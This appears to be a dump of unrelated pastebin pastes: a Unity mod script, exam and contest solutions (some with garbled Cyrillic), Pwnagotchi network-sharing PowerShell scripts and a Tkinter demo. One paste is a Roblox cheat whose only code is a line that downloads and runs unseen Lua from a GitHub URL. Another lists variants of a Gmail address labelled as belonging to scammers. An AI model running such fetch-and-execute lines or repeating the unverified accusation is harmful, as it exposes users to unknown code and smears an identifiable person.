                foreach (var rangedMics in rangedMicrophones) { rangedMics.StopRecording(); }
            }
            else
            {
                if (rangedMicrophones.Count > 0) { rangedMicrophones[tuneIndex].StartRecording(); }
                
            }

            TombsMadnessModBase.mls.LogWarning(""the Recon Station have been turned on!"");
        }

        public void SwitchChannelForwordButton()
        {
            if(enabled)
            {
                if (rangedMicrophones.Count > 1 && tuneIndex < rangedMicrophones.Count - 1)
                {
                    rangedMicrophones[tuneIndex].StopRecording();
                    tuneIndex++;
                    rangedMicrophones[tuneIndex].StartRecording();
                    TombsMadnessModBase.mls.LogWarning(""Shifting to the next mic in the list with an index of "" + tuneIndex);
                }
                TombsMadnessModBase.mls.LogWarning(""looks like the forword button was pressed"");
            }
        }
        public void SwitchChannelBackButton()
        {
            if (enabled)
            {
                if (rangedMicrophones.Count > 1 && tuneIndex > 0)
                {
                    rangedMicrophones[tuneIndex].StopRecording();
                    tuneIndex--;
                    rangedMicrophones[tuneIndex].StartRecording();
                    TombsMadnessModBase.mls.LogWarning(""Shifting to the last mic in the list with an index of "" + tuneIndex);
                }
                TombsMadnessModBase.mls.LogWarning(""looks like the back button was pressed"");
            }
        }

    }
}

///RANGED MIC CODE

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using TombsMadnessMod.Unlockables;
using UnityEngine;
using UnityEngine.InputSystem;

namespace TombsMadnessMod.ItemScript
{
    public class RangedMicrophone : GrabbableObject
    {
        private ModdedUI m_UI;
        public bool isPowerd;
        public bool tunedInto;
        public float micRange;

        private AudioSource audioSource;

        private AudioListener playerAudioListener;
        private AudioListener micAudioListener;

        public AudioClip[] stopTransmissionSFX;
         
        public AudioClip[] startTransmissionSFX;
         
        public AudioClip clickON;


        public void Awake()
        {
            TombsMadnessModBase.mls.LogInfo(""RangedMicrophone Awake"");
            m_UI = TombsMadnessModBase.ModdedUI.GetComponent<ModdedUI>();
            ReconStation.rangedMicrophones.Add(this);
        }
        public override void Start()
        {
            base.Start();
            playerAudioListener = StartOfRound.Instance.localPlayerController.activeAudioListener;
            audioSource = GetComponent<AudioSource>();
            micAudioListener = this.GetComponent<AudioListener>();
        }


        public override void OnDestroy()
        {
            base.OnDestroy();
            ReconStation.rangedMicrophones.Remove(this);
        }

        public override void ItemActivate(bool used, bool buttonDown = true)
        {
            base.ItemActivate(used, buttonDown);
            SwitchOn(used);
            audioSource.pitch = UnityEngine.Random.Range(0.7f, 1.3f);
            audioSource.PlayOneShot(clickON);
        }

        public void SwitchOn(bool enabled)
        {
            isBeingUsed = enabled;
        }

        public void StartRecording()
        {
            TombsMadnessModBase.mls.LogWarning(this.name + "" has started recording!"");
            playerAudioListener.enabled = false;
            micAudioListener.enabled = true;
        }

        public void StopRecording()
        {
            TombsMadnessModBase.mls.LogWarning(this.name + "" has Stopped recording!"");
            playerAudioListener.enabled = true;
            micAudioListener.enabled = false;
        }

    }
}
"
BUhW6SFU,"–ò–Ω—Ñ–æ—Ä–º–∞—Ç–∏–∫–∞, –ï–ì–≠. ‚Ññ63030",Rakabidasta,Python,Sunday 7th of January 2024 03:06:39 AM CDT,"# –¢–∏–ø 14¬†‚Ññ63030

# –ò–¥—ë–º –ø–æ –≤—Å–µ–º x
for x in range(40):
	# –ò–¥—ë–º –ø–æ –≤—Å–µ–º y
    for y in range(40):
	
		# –°—á–∏—Ç–∞–µ–º –Ω—É–∂–Ω–æ–µ –Ω–∞–º –≤—ã—Ä–∞–∂–µ–Ω–∏–µ 
        a = 5*40**8 + 7*40**7 + x*40**6 + 6*40**5 + 9*40**4 + 2*40**3 + y*40**2 + 1*40 + 9

		# –ï—Å–ª–∏ –æ–Ω–æ –∫—Ä–∞—Ç–Ω–æ 39, —Ç–æ
        if a % 39 == 0:
			# –ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ –¥—Ä—É–≥–∏–º –≤—ã—á–∏—Å–ª–µ–Ω–∏—è–º
            b = y*40 + x
			
			# –î–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ–ª–Ω–æ–≥–æ –∫–≤–∞–¥—Ä–∞—Ç–∞ –≤–æ–∑—å–º—ë–º –∫–æ—Ä–µ–Ω—å –∏ –æ–∫—Ä—É–≥–ª–∏–º –µ–≥–æ –¥–æ —Ü–µ–ª–æ–≥–æ
            b_koren = round(b ** 0.5)

			# –ï—Å–ª–∏ –ø–æ–ª—É—á–µ–Ω–Ω—ã–π –û–ö–†–£–ì–õ–Å–ù–ù–ù–´–ô –∫–æ—Ä–µ–Ω—å –≤ –∫–≤–∞–¥—Ä–∞—Ç–µ –¥–∞—ë—Ç –∏—Å—Ö–æ–¥–Ω–æ–µ –≤—ã—Ä–∞–∂–µ–Ω–∏–µ, —Ç–æ —ç—Ç–æ –ø–æ–ª–Ω—ã–π –∫–≤–∞–¥—Ä–∞—Ç
            if b_koren ** 2 == b:
                print(b)
"
TQcPkDP2,Untitled,Rofyda_Elghadban1,C++,Sunday 7th of January 2024 02:37:13 AM CDT," #include <bits/stdc++.h> 
 #define ll long long
 #define ull unsigned long long
 #define pi 3.141592654
 #define NUM 1e18
 #define Mod  1'000'000'007
 #define fixed(n) fixed<<setprecision(n)
 #define cin(v) for(auto &i:v) cin >> i ;
 #define cout(v) for(auto &i:v) cout << i  <<"" "";
 #define vowel(x) (x=='e'||x=='a'||x=='i'||x=='o'||x=='u')
 #define small(x) (x>=97&&x<=122)
 #define capital(x) (x>=65&&x<=90)
 #define Tolower(s) transform(s.begin(),s.end(),s.begin(),::tolower);
 #define Toupper(s) transform(s.begin(),s.end(),s.begin(),::toupper); 
 #define sz(x) (int)(x.size())
 #define all(v) ((v).begin()), ((v).end())
 #define allr(v) ((v).rbegin()), ((v).rend())
 #define updmax(a,b) a=max(a,b)
 #define updmin(a,b) a=min(a,b)
 #define ceil(a,b) ((a/b)+(a%b?1:0))
 /* asc -> 1 2 3 ,des -> 3 2 1 */

 /***********************************************************************************/
 using namespace std;
 void Rofyda_Elghadban(){
  #ifndef ONLINE_JUDGE   
    freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout);
   #endif
    ios_base::sync_with_stdio(false), cin.tie(nullptr), cout.tie(nullptr);
 }

 void solve(){
  int n,counter=0;
  cin>>n;
  string s;
  cin>>s;
  if(n==1){
    cout<<0<<""\n""<<s<<""\n"";
    return;
  }
  if(n==2){
    if(s[0]==s[1]){
      cout<<1<<""\n""<<s[0];
      if(s[0]=='R'){
        cout<<""G""<<""\n"";
      }else if(s[0]=='G'){
        cout<<""B""<<""\n"";
      }else if(s[0]=='B'){
        cout<<""R""<<""\n"";
      }
    }else if(s[0]!=s[1]){
      cout<<0<<""\n""<<s<<""\n"";
    }
    return;
  }
  string t=""BGR"";
  sort(all(t));
  map<int,string>mp;
  string ss=s;
  do{
    if(n%3==0){
      for(int i=0;i<n;i+=3){
        if(s[i]!=t[0]){
          ss[i]=t[0];
          counter++;
        }
        if(s[i+1]!=t[1]&&i+1<n-1){
          ss[i+1]=t[1];
          counter++;
        }
        if(s[i+2]!=t[2]&&i+2<n){
          ss[i+2]=t[2];
          counter++;
        }
      }
    }
    else if(n%3==1){
      for(int i=0;i<n-1;i+=3){
        if(s[i]!=t[0]){
          ss[i]=t[0];
          counter++;
        }
        if(s[i+1]!=t[1]&&i+1<n-2){
          ss[i+1]=t[1];
          counter++;
        }
        if(s[i+2]!=t[2]&&i+2<n-1){
          ss[i+2]=t[2];
          counter++;
        }
      }
      if(s[n-1]!=t[0]){
        ss[n-1]=t[0];
        counter++;
      }
    }
    else if(n%3==2){
      for(int i=0;i<n-2;i+=3){
        if(s[i]!=t[0]){
          ss[i]=t[0];
          counter++;
        }
        if(s[i+1]!=t[1]&&i+1<n-3){
          ss[i+1]=t[1];
          counter++;
        }
        if(s[i+2]!=t[2]&&i+2<n-2){
          ss[i+2]=t[2];
          counter++;
        }
      }
      for(int i=n-2;i<n;i+=2){
        if(s[i]!=t[0]){
          ss[i]=t[0];
          counter++;
        }
        if(s[i+1]!=t[1]&&i+1<n){
          ss[i+1]=t[1];
          counter++;
        }
      }
    }
    mp[counter]=ss;
    ss=s;
    counter=0;
  }while(next_permutation(t.begin(),t.end()));
  for(auto &i:mp){
    cout<<i.first<<""\n""<<i.second<<""\n"";
    return;
  }
 }

 int main(){
  Rofyda_Elghadban(); 
  // int t;
  // cin>>t;
  // while(t--){
  //   solve();
  // }
  solve();
  return 0;
 }
¬†"
SL1ynbg3,adaptable script tomagatchi,Tom_Neverwinter,PowerShell,Sunday 7th of January 2024 02:00:07 AM CDT,"#Requires -Version 5
#Requires -RunAsAdministrator
[Cmdletbinding()]
Param (
    [switch]$EnableInternetConnectionSharing,
    [switch]$DisableInternetConnectionSharing,
    [switch]$SetPwnagotchiSubnet,
    [ipaddress]$ScopeAddress = '192.168.137.1',  # Default value, can be overridden
    [string]$SubnetPrefix = '192.168.137.'        # Default prefix, can be overridden
)

# Load helper functions
Function Create-HNetObjects {
    <#
    .SYNOPSIS
        A helper function that does the heavy lifting with NetCfg.HNetShare
    #>
    [Cmdletbinding()]
    Param (
        $InternetAdaptor = $(Select-NetAdaptor -Message ""Please select your main ethernet adaptor with internet access that will be used for internet sharing.""),
        $RNDISGadget = $(Select-NetAdaptor -Message ""Please select your 'USB Ethernet/RNDIS Gadget' adaptor"")
    )
    Begin {
        regsvr32.exe /s hnetcfg.dll
        $HNetShare = New-Object -ComObject HNetCfg.HNetShare
    }
    Process {
        if ($HNetShare.EnumEveryConnection -ne $null) {
            $InternetInt       = $HNetShare.EnumEveryConnection | Where-Object { $HNetShare.NetConnectionProps.Invoke($_).Name -eq ($InternetAdaptor).Name }
            $InternetIntConfig = $HNetShare.INetSharingConfigurationForINetConnection.Invoke($InternetInt)
            $RNDISInt          = $HNetShare.EnumEveryConnection | Where-Object { $HNetShare.NetConnectionProps.Invoke($_).Name -eq ($RNDISGadget).Name }
            $RNDISIntConfig    = $HNetShare.INetSharingConfigurationForINetConnection.Invoke($RNDISInt)
        }
    }
    End {
        Return $(New-Object -TypeName PSObject -Property @{InternetIntConfig=$InternetIntConfig;RNDISIntConfig=$RNDISIntConfig;})
    }
}

Function Enable-InternetConnectionSharing {
    <#
    .SYNOPSIS
        Enables internet connection sharing between the 'main' uplink interface and the 'USB Ethernet/RNDIS Gadget' interface.
    #>
    [Cmdletbinding()]
    $HNetObject = Create-HNetObjects
    $HNetObject.InternetIntConfig.EnableSharing(0)
    $HNetObject.RNDISIntConfig.EnableSharing(1)
    Write-Output ""[x] Enabled Internet Connection Sharing.""
}

Function Disable-InternetConnectionSharing {
    <#
    .SYNOPSIS
        Disables internet connection sharing between the 'main' uplink interface and the 'USB Ethernet/RNDIS Gadget' interface.
    #>
    [Cmdletbinding()]
    $HNetObject = $(Create-HNetObjects)
    $HNetObject.InternetIntConfig.DisableSharing()
    $HNetObject.RNDISIntConfig.DisableSharing()
    Write-Output ""[x] Disabled Internet Connection Sharing.""
}

Function Test-PwnagotchiSubnet {
    <#
    .SYNOPSIS
        Tests the registry for the correct ScopeAddress.
    #>
    [Cmdletbinding()]
    Try {
        $RegKeys = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters -ErrorAction Stop
        If ($RegKeys.ScopeAddress -notlike ""$SubnetPrefix*"") {
            Write-Error ""Internet Connection Sharing is not set to the expected subnet. Run Set-PwnagotchiSubnet with the correct parameters."" -ErrorAction Stop
        }
    } Catch {
        Write-Error ""Error accessing registry to check ICS subnet: $_"" -ErrorAction Stop
    }
}

Function Set-PwnagotchiSubnet {
    <#
    .SYNOPSIS
        Set the registry for the correct ScopeAddress.
    #>
    [Cmdletbinding()]
    Param (
        [ipaddress]$ScopeAddress
    )
    Try {
        [void]([ipaddress]$ScopeAddress)
        [void]([byte[]] $ScopeAddress.split('.'))
    } Catch {
        Write-Error ""$ScopeAddress is not a valid IP.""
    }
    Try {
        Set-ItemProperty -Name ScopeAddress       -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\"" -Value $ScopeAddress -ErrorAction Stop
        Set-ItemProperty -Name ScopeAddressBackup -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\"" -Value $ScopeAddress -ErrorAction Stop
        Write-Warning ""The Internet Connection Sharing subnet has been updated. A reboot of windows is required !""
    } Catch {
        $PSCmdlet.ThrowTerminatingError($PSItem)
    }
}

# Main Function
Function Setup-PwnagotchiNetwork {
    <#
    .SYNOPSIS
        Function to setup networking.
    #>
    Param (
        [switch]$EnableInternetConnectionSharing,
        [switch]$DisableInternetConnectionSharing,
        [switch]$SetPwnagotchiSubnet,
        $ScopeAddress = '192.168.2.1'  # Default to 192.168.2.1 for AT&T compatibility
    )
    Begin {
        Try {
            Write-Debug ""Begin""
            $ErrorSplat=@{ErrorAction=""stop""}
            Write-Debug ""Testing subnet""
            Try {
                Test-PwnagotchiSubnet @ErrorSplat
            } Catch {
                If ($SetPwnagotchiSubnet) {
                    Write-Debug ""Setting subnet""
                    Set-PwnagotchiSubnet -ScopeAddress $ScopeAddress @ErrorSplat
                } Else {
                    Write-Error ""Internet Connection Sharing is not set to the expected subnet. Run this script with the -SetPwnagotchiSubnet to setup the network."" -ErrorAction Stop
                }
            }
        } Catch {
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
    }
    Process {
        Write-Debug ""Process""
        Try {
            If ($EnableInternetConnectionSharing) {
                Write-Debug ""Enable network Sharing""
                Enable-InternetConnectionSharing @ErrorSplat
            } ElseIf ($DisableInternetConnectionSharing) {
                Write-Debug ""Disable network Sharing""
                Disable-InternetConnectionSharing @ErrorSplat
            }
        } Catch {
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
    }
    End {
        Write-Debug ""End""
        Try {
            # Nothing to return.
        } Catch {
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
    }
}

Function Select-NetAdaptor {
    <#
    .SYNOPSIS
        A menu function to select the correct network adaptors.
    #>
    Param (
        $Message
    )
    $Adaptors = Get-NetAdapter | Where-Object {$_.MediaConnectionState -eq 'Connected'} | Sort-Object LinkSpeed -Descending
    do { 
        Write-Host $Message
        $index = 1
        foreach ($Adaptor in $Adaptors) {
            Write-Host ""[$index] $($Adaptor.Name), $($Adaptor.InterfaceDescription)""
            $index++
        }   
        $Selection = Read-Host ""Number""
    } until ($Adaptors[$selection-1])
     Return $Adaptors[$selection-1]
}

# Dynamically create params for Setup-PwnagotchiNetwork function based on script input.
Setup-PwnagotchiNetwork @psBoundParameters
"
waCmGmgv,# tk_Ultra_Fast_Reaction_Diffusion.py,here2share,Python,Sunday 7th of January 2024 01:26:19 AM CDT,"# tk_Ultra_Fast_Reaction_Diffusion.py

import tkinter as tk
from PIL import Image, ImageTk, ImageFilter
import random

ww = 560
hh = 560
ww0, hh0 = ww + 2, hh + 2
center_x = ww // 2
center_y = hh // 2

root = tk.Tk()
root.title(""tk_Ultra_Fast_Reaction_Diffusion"")
root.geometry('+0+0')

canvas = tk.Canvas(root, width=ww, height=hh, bg='white')

def update_params_x(value):
    global x0
    x0 = float(value)

def update_params_y(value):
    global y0
    y0 = float(value)

def update_params_z(value):
    global z0
    z0 = float(value)

x0 = 5
y0 = 5
z0 = 2

even_dist = [192] * (ww0*hh0//2)
even_dist += [80] * (ww0*hh0//2)
random.shuffle(even_dist)

x_slider = tk.Scale(root, from_=99, to=0, label='X', resolution=1, orient=tk.VERTICAL, bg=""#FFFF00"")
x_slider.set(x0)

y_slider = tk.Scale(root, from_=99, to=0, label='Y', resolution=1, orient=tk.VERTICAL, bg=""#00FF00"")
y_slider.set(y0)

z_slider = tk.Scale(root, from_=99, to=0, label='Z', resolution=1, orient=tk.VERTICAL, bg=""#00C0FF"")
z_slider.set(z0)

canvas.pack(side=tk.LEFT)
x_slider.pack(side=tk.LEFT, fill='y')
y_slider.pack(side=tk.LEFT, fill='y')
z_slider.pack(side=tk.LEFT, fill='y')

x_slider.config(command=lambda value: update_params_x(x_slider.get()))
y_slider.config(command=lambda value: update_params_y(y_slider.get()))
z_slider.config(command=lambda value: update_params_z(z_slider.get()))

ref_image = Image.new(""RGB"", (ww0, hh0), ""white"")

kernel_values = [0.05, 0.2, 0.05, 0.2, -1, 0.2, 0.05, 0.2, 0.05]

def display()	:	
	img = ref_image.crop((0, 0, ww, hh))
	img_tk = ImageTk.PhotoImage(img)
	canvas.create_image(0, 0, anchor=""nw"", image=img_tk)
	canvas.img = img_tk
	root.update()
	ref_image.putpixel((center_x, center_y - 1), (255, 255, 255))
	ref_image.putpixel((center_x, center_y + 1), (0, 0, 0))

pixel_data = []
for i in range(hh0):
    for j in range(ww0):
        c = even_dist.pop()
        pixel_data.append((c, c, c))
ref_image.putdata(pixel_data)
display()

kernel = ImageFilter.Kernel((3, 3), kernel_values, scale=None, offset=0)
while True:
	x, y, z = x0, y0, z0
	ref_image = ref_image.filter(ImageFilter.GaussianBlur(x))
	ref_image = ref_image.filter(kernel)
	ref_image = ref_image.filter(ImageFilter.GaussianBlur(y))
	ref_image = ref_image.filter(kernel)
	ref_image = ref_image.filter(ImageFilter.GaussianBlur(z))
	display()
"
zwbFHW3n,pwnagatchi,Tom_Neverwinter,PowerShell,Sunday 7th of January 2024 01:14:38 AM CDT,"#Requires -Version 5
#Requires -RunAsAdministrator
[Cmdletbinding()]
Param (
    [switch]$EnableInternetConnectionSharing,
    [switch]$DisableInternetConnectionSharing,
    [switch]$SetPwnagotchiSubnet,
    [ipaddress]$ScopeAddress = '192.168.2.1'  # Default to 192.168.2.1 for AT&T compatibility
)

# Load helper functions
Function Create-HNetObjects {
    <#
    .SYNOPSIS
        A helper function that does the heavy lifting with NetCfg.HNetShare
    
    .DESCRIPTION
        A helper function that does the heavy lifting with NetCfg.HNetShare. This returns a PSObject containing the `INetSharingConfigurationForINetConnection` info of 2 Adapters.
    
    .PARAMETER InternetAdaptor
        The output of Get-NetAdaptor filtered down to the 'main' uplink interface.
    
    .PARAMETER RNDISGadget
        The output of Get-NetAdaptor filtered down to the 'USB Ethernet/RNDIS Gadget' interface.
    
    .EXAMPLE
        PS> $HNetObject = Create-HNetObjects
        PS> $HNetObject
            RNDISIntConfig     InternetIntConfig
            --------------     -----------------
            System.__ComObject System.__ComObject
    #>
    [Cmdletbinding()]
    Param (
        $InternetAdaptor = $(Select-NetAdaptor -Message ""Please select your main ethernet adaptor with internet access that will be used for internet sharing.""),
        $RNDISGadget = $(Select-NetAdaptor -Message ""Please select your 'USB Ethernet/RNDIS Gadget' adaptor"")
    )
    Begin {
        regsvr32.exe /s hnetcfg.dll
        $HNetShare = New-Object -ComObject HNetCfg.HNetShare
    }
    Process {
        if ($HNetShare.EnumEveryConnection -ne $null) {
            $InternetInt       = $HNetShare.EnumEveryConnection | Where-Object { $HNetShare.NetConnectionProps.Invoke($_).Name -eq ($InternetAdaptor).Name }
            $InternetIntConfig = $HNetShare.INetSharingConfigurationForINetConnection.Invoke($InternetInt)
            $RNDISInt          = $HNetShare.EnumEveryConnection | Where-Object { $HNetShare.NetConnectionProps.Invoke($_).Name -eq ($RNDISGadget).Name }
            $RNDISIntConfig    = $HNetShare.INetSharingConfigurationForINetConnection.Invoke($RNDISInt)
        }
    }
    End {
        Return $(New-Object -TypeName PSObject -Property @{InternetIntConfig=$InternetIntConfig;RNDISIntConfig=$RNDISIntConfig;})
    }
}

Function Enable-InternetConnectionSharing {
    <#
    .SYNOPSIS
        Enables internet connection sharing between the 'main' uplink interface and the 'USB Ethernet/RNDIS Gadget' interface.
    
    .DESCRIPTION
        Enables internet connection sharing between the 'main' uplink interface and the 'USB Ethernet/RNDIS Gadget' interface.
    
    .EXAMPLE
        PS> Enable-InternetConnectionSharing
    
    #>
    [Cmdletbinding()]
    $HNetObject = Create-HNetObjects
    $HNetObject.InternetIntConfig.EnableSharing(0)
    $HNetObject.RNDISIntConfig.EnableSharing(1)
    Write-Output ""[x] Enabled Internet Connection Sharing.""
}

Function Disable-InternetConnectionSharing {
    <#
    .SYNOPSIS
        Disables internet connection sharing between the 'main' uplink interface and the 'USB Ethernet/RNDIS Gadget' interface.
    
    .DESCRIPTION
        Disables internet connection sharing between the 'main' uplink interface and the 'USB Ethernet/RNDIS Gadget' interface.

    .EXAMPLE
        PS> Disable-InternetConnectionSharing
    
    #>
    [Cmdletbinding()]
    $HNetObject = $(Create-HNetObjects)
    $HNetObject.InternetIntConfig.DisableSharing()
    $HNetObject.RNDISIntConfig.DisableSharing()
    Write-Output ""[x] Disabled Internet Connection Sharing.""
}

Function Test-PwnagotchiSubnet {
    <#
    .SYNOPSIS
        Tests the registry for the correct ScopeAddress.
    
    .DESCRIPTION
        Tests the registry for the correct ScopeAddress. By default windows uses a 192.168.137.x subnet for Internet Connection Sharing. This value can be changed
        in the registry.
    
    .EXAMPLE
        PS> Test-PwnagotchiSubnet
        [!] By default Internet Connection Sharing uses a 192.168.137.x subnet. Run Set-PwnagotchiSubnet to ensure you and your little friend are on the same subnet.
    #>
    [Cmdletbinding()]
    $RegKeys = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters -ErrorAction Stop
    If ($RegKeys.ScopeAddress -notmatch '192.168.2.') {  # Updated to check for 192.168.2.x subnet
        Write-Error ""By default Internet Connection Sharing uses a 192.168.137.x subnet. Run Set-PwnagotchiSubnet to ensure you and your little friend are on the same subnet."" -ErrorAction Stop
    }
    If ($RegKeys.ScopeAddressBackup -notmatch '192.168.2.') {
        Write-Error ""By default Internet Connection Sharing uses a 192.168.137.x subnet. Run Set-PwnagotchiSubnet to ensure you and your little friend are on the same subnet."" -ErrorAction Stop
    } 
}

Function Set-PwnagotchiSubnet {
    <#
    .SYNOPSIS
        Set the registry for the correct ScopeAddress.
    
    .DESCRIPTION
        Set the registry for the correct ScopeAddress. By default windows uses a 192.168.137.x subnet for Internet Connection Sharing. This value can be changed
        in the registry. By default it will be changed to 192.168.2.1
    
    .PARAMETER ScopeAddress
        The IP address the USB Gadget interface should use.
    
    .EXAMPLE
    Set-PwnagotchiSubnet
    
    #>
    [Cmdletbinding()]
    Param (
        $ScopeAddress = '192.168.2.1'  # Changed to 192.168.2.1 for AT&T compatibility
    )
    Try {
        [void]([ipaddress]$ScopeAddress)
        [void]([byte[]] $ScopeAddress.split('.'))
    } Catch {
        Write-Error ""$ScopeAddress is not a valid IP.""
    }
    Try {
        Set-ItemProperty -Name ScopeAddress       -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\"" -Value $ScopeAddress -ErrorAction Stop
        Set-ItemProperty -Name ScopeAddressBackup -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\"" -Value $ScopeAddress -ErrorAction Stop
        Write-Warning ""The Internet Connection Sharing subnet has been updated. A reboot of windows is required !""
    } Catch {
        $PSCmdlet.ThrowTerminatingError($PSItem)
    }
 
}

# Main Function
Function Setup-PwnagotchiNetwork {
    <#
    .SYNOPSIS
        Function to setup networking.
    
    .DESCRIPTION
        Function to setup networking. Main function calls helpers functions.
    
    .PARAMETER EnableInternetConnectionSharing
        Enable Internet Connection Sharing
    
    .PARAMETER DisableInternetConnectionSharing
        Disable Internet Connection Sharing
    
    .PARAMETER SetPwnagotchiSubnet
        Change the Internet Connection Sharing subnet to the Pwnagotchi. Defaults to 10.0.0.1.
    
    .PARAMETER ScopeAddress
        Custom ScopeAddress (the ICS ip address)
    
    .EXAMPLE
        PS> Setup-PwnagotchiNetwork -EnableInternetConnectionSharing
    
    #>
    
    Param (
        [switch]$EnableInternetConnectionSharing,
        [switch]$DisableInternetConnectionSharing,
        [switch]$SetPwnagotchiSubnet,
        $ScopeAddress = '10.0.0.1'
    )
    Begin {
        Try {
            Write-Debug ""Begin""
            $ErrorSplat=@{ErrorAction=""stop""}
            Write-Debug ""Testing subnet""
            Try {
                Test-PwnagotchiSubnet @ErrorSplat
            } Catch {
                If ($SetPwnagotchiSubnet) {
                    Write-Debug ""Setting subnet""
                    Set-PwnagotchiSubnet -ScopeAddress $ScopeAddress @ErrorSplat
                } Else {
                    Write-Error ""By default Internet Connection Sharing uses a 192.168.137.x subnet. Run this script with the -SetPwnagotchiSubnet to setup the network."" -ErrorAction Stop
                }
            }
        } Catch {
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
    }
    Process {
        Write-Debug ""Process""
        Try {
            If ($EnableInternetConnectionSharing) {
                Write-Debug ""Enable network Sharing""
                Enable-InternetConnectionSharing @ErrorSplat
            } ElseIf ($DisableInternetConnectionSharing) {
                Write-Debug ""Disable network Sharing""
                Disable-InternetConnectionSharing @ErrorSplat
            }
        } Catch {
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
    }
    End {
        Write-Debug ""End""
        Try {
            # Nothing to return.
        } Catch {
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
    }
}
Function Select-NetAdaptor {
    <#
    .SYNOPSIS
        A menu function to select the correct network adaptors.
    
    .DESCRIPTION
        A menu function to select the correct network adaptors.
    
    .PARAMETER Message
        Message that will be displayed during the question.
    
    #>
    
    Param (
        $Message
    )
    $Adaptors = Get-NetAdapter | Where-Object {$_.MediaConnectionState -eq 'Connected'} | Sort-Object LinkSpeed -Descending
    do { 
        Write-Host $Message
        $index = 1
        foreach ($Adaptor in $Adaptors) {
            Write-Host ""[$index] $($Adaptor.Name), $($Adaptor.InterfaceDescription)""
            $index++
        }   
        $Selection = Read-Host ""Number""
    } until ($Adaptors[$selection-1])
     Return $Adaptors[$selection-1]
}
# Dynamically create params for Setup-PwnagotchiNetwork function based of param input of script.
Setup-PwnagotchiNetwork @psBoundParameters"
6rdCKxGn,Pet Simulator 99! üéâ 2024 AutoFarm Script (Keyless),Project-WD,Lua,Sunday 7th of January 2024 12:44:22 AM CDT,"-- Pet Simulator 99! üéâ AutoFarm Script! (Copy and Paste into Executor) (Executors: Delta, ArceusX...)
-- üÜï Updated (07/01/2024) (Insane Script)
-- Auto Farm, Auto Ranks, Boothsniper, No Egg Animation, etc...

-- Scriptüìù: 
loadstring(game:HttpGet(""https://raw.githubusercontent.com/REDzHUBz/PetSimulator99/main/redz9999.lua"" ))()"
Y1twDj8M,Nigerian scammers [7-1-1/2024],bombaires,AIMMS,Sunday 7th of January 2024 12:31:19 AM CDT,"<a href=""mailto:miracmustafa232@gmail.com"">miracmustafa232@gmail.com</a>
<a href=""mailto:m.i.r.acmust.afa.2.3.2@gmail.com"">m.i.r.acmust.afa.2.3.2@gmail.com</a>
<a href=""mailto:m.iracmu.sta.f.a23.2@gmail.com"">m.iracmu.sta.f.a23.2@gmail.com</a>
<a href=""mailto:mi.ra.cm.u.stafa.2.3.2@gmail.com"">mi.ra.cm.u.stafa.2.3.2@gmail.com</a>
<a href=""mailto:m.i.r.acm.us.t.afa2.3.2@gmail.com"">m.i.r.acm.us.t.afa2.3.2@gmail.com</a>
<a href=""mailto:mira.cmus.tafa2.3.2@gmail.com"">mira.cmus.tafa2.3.2@gmail.com</a>
<a href=""mailto:m.i.r.a.cmust.af.a2.3.2@gmail.com"">m.i.r.a.cmust.af.a2.3.2@gmail.com</a>
<a href=""mailto:m.i.r.a.cmusta.fa.232@gmail.com"">m.i.r.a.cmusta.fa.232@gmail.com</a>
<a href=""mailto:mirac.m.us.t.a.fa.23.2@gmail.com"">mirac.m.us.t.a.fa.23.2@gmail.com</a>
<a href=""mailto:m.ir.acm.u.st.a.f.a.2.32@gmail.com"">m.ir.acm.u.st.a.f.a.2.32@gmail.com</a>
<a href=""mailto:m.i.r.a.cm.u.st.a.f.a23.2@gmail.com"">m.i.r.a.cm.u.st.a.f.a23.2@gmail.com</a>
<a href=""mailto:mira.c.mustafa232@gmail.com"">mira.c.mustafa232@gmail.com</a>
<a href=""mailto:mi.ra.c.m.ust.af.a23.2@gmail.com"">mi.ra.c.m.ust.af.a23.2@gmail.com</a>
<a href=""mailto:m.ir.acmus.ta.f.a.2.3.2@gmail.com"">m.ir.acmus.ta.f.a.2.3.2@gmail.com</a>
<a href=""mailto:mi.ra.cmu.s.ta.f.a.232@gmail.com"">mi.ra.cmu.s.ta.f.a.232@gmail.com</a>
<a href=""mailto:m.i.r.ac.m.u.s.t.afa2.3.2@gmail.com"">m.i.r.ac.m.u.s.t.afa2.3.2@gmail.com</a>
<a href=""mailto:m.ira.c.m.us.t.af.a232@gmail.com"">m.ira.c.m.us.t.af.a232@gmail.com</a>
<a href=""mailto:m.ir.acm.u.s.tafa2.3.2@gmail.com"">m.ir.acm.u.s.tafa2.3.2@gmail.com</a>
<a href=""mailto:miracmu.s.t.a.f.a232@gmail.com"">miracmu.s.t.a.f.a232@gmail.com</a>
<a href=""mailto:mir.acm.u.s.t.a.fa23.2@gmail.com"">mir.acm.u.s.t.a.fa23.2@gmail.com</a>
<a href=""mailto:mi.r.a.c.m.ustaf.a232@gmail.com"">mi.r.a.c.m.ustaf.a232@gmail.com</a>
<a href=""mailto:mi.r.acmus.tafa2.3.2@gmail.com"">mi.r.acmus.tafa2.3.2@gmail.com</a>
<a href=""mailto:mir.ac.m.ust.a.fa.2.3.2@gmail.com"">mir.ac.m.ust.a.fa.2.3.2@gmail.com</a>
<a href=""mailto:mir.a.cm.us.t.a.fa232@gmail.com"">mir.a.cm.us.t.a.fa232@gmail.com</a>
<a href=""mailto:mirac.must.afa.2.32@gmail.com"">mirac.must.afa.2.32@gmail.com</a>
<a href=""mailto:m.ir.ac.m.u.s.t.af.a232@gmail.com"">m.ir.ac.m.u.s.t.af.a232@gmail.com</a>
<a href=""mailto:m.ir.ac.mu.s.ta.f.a.2.32@gmail.com"">m.ir.ac.mu.s.ta.f.a.2.32@gmail.com</a>
